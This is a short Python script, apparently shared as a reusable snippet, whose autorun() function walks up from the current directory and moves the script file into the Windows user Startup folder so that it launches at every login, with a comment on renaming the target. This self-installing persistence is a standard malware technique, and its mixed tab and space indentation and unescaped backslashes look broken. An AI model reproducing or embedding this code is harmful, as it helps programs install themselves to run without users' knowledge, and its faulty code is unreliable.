import shutil
import os
#programmed by Unknown333

def autorun():

	filepos = __file__
	src = filepos
	CURR_DIR = os.getcwd()
	yy = int(CURR_DIR.count("\\"))
	p = 3

	while yy > p:


        	os.chdir('../')
       		yy = yy-1

       
	os.chdir('../')
	CURR_DIR = os.getcwd()
											   
	CURR_DIR = CURR_DIR + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.*" #Replace the actual * with the name of your actual file (or a different name if you want to rename it, but be careful to make sure that the name of your file is unique in the folder where you are going to put it, otherwise it will not move. ) and the extension of your file
	dst = CURR_DIR

    
	shutil.move(src=src, dst=dst)

autorun()
